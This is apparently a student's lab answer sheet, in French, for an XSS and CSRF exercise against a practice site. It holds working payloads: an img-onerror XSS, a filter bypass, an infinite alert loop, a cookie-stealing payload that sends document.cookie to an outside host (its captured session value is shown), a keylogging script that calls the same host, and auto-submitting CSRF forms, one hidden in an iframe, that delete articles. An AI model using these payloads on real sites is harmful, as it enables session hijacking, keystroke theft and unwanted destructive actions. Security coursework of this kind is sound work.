# Réponses TP XSS-CSRF

## Partie 1:

### Level 1:

1. ```html
   <img src='non_existing_image.jpg' onerror= alert("Bonjour l'Internet") ></img>
   ```

### Level 2:

1. ```html
   <img src='non_existing_image.jpg' onerror= alert("Bonjour l'Internet") ></img>
   ```

   dans le champ Titre

2. les concepteur du site ont supprimés les balises script

3. Elles sont récupérées en dur sans filtre

4. ```html
   <img src='non_existing_image.jpg' onerror=while(true){ alert("Bonjour l'Internet")} ></img>
   ```

5. ```html
   <img src='non_existing_image.jpg' onerror="var addr = 'https://my-malicious-ws-vincent.herokuapp.com/' + document.cookie; var imgTag = document.createElement('img') ; imgTag.setAttribute('src', addr); document.body.appendChild(imgTag);" ></img>
   ```

   connect.sid=s%3A-m10uXC7L9XXJypeeOg9SGPGW8937HDS.DCmr35jaEgkiURpg5r0AZaHS0%2BvRfzSow%2Bgp5i5n3C0:1 GET https://my-malicious-website-vincent.herokuapp.com/connect.sid=s%3A-m10uXC7L9XXJypeeOg9SGPGW8937HDS.DCmr35jaEgkiURpg5r0AZaHS0%2BvRfzSow%2Bgp5i5n3C0 404 (Not Found)

### Level 3:

1. ```html
   <i<img>mg src='non_existing_image.jpg' onerror= alert("Bonjour l'Internet")/>
   ```

2. ```javascript
   <i<img>mg src='non_existing_image.jpg' onerror=
       function() {
         var httpRequest;
         window.addEventListener('keypress', f);
   
         function f() {
           httpRequest = new XMLHttpRequest();
   
           if (!httpRequest) {
             console.log('Problème /!\ Impossible de créer une requête XMLHttp');
             return false;
           }
           httpRequest.onreadystatechange = alert;
           httpRequest.open('GET', 'https://my-malicious-website-vincent.herokuapp.com/keylogger.php');
           httpRequest.setRequestHeader('Access-Control-Allow-Origin', null);
           httpRequest.send();
         }
   
         function alert() {
           if (httpRequest.readyState === XMLHttpRequest.DONE) {
             if (httpRequest.status === 200) {
               console.log(httpRequest.responseText);
             } else {
               console.log('Error /!\ Request Problem');
             }
           }
         }
       }
   />
   ```

## Partie 2:

1. [Mon site](https://my-malicious-website-vincent.herokuapp.com/)

2. ```php+HTML
   <?php include_once("index.html"); ?>
   
   <form
       action="https://xss-csrf-tp.herokuapp.com/articles/delete"
       method="GET"
       id="42"
   >
   </form>
   
   <script>
       document.getElementById("42").submit();
   </script>
   ```

3. ```php+HTML
   <?php include_once("index.html"); ?>
   
   <iframe name="hiddenIFrame" style="display: none;"></iframe>
   
   <form
       action="https://xss-csrf-tp.herokuapp.com/articles/delete"
       method="about:blank"
       id="42"
       target="hiddenIFrame"
   >
   </form>
   
   <script>
       document.getElementById("42").submit();
   </script>
   ```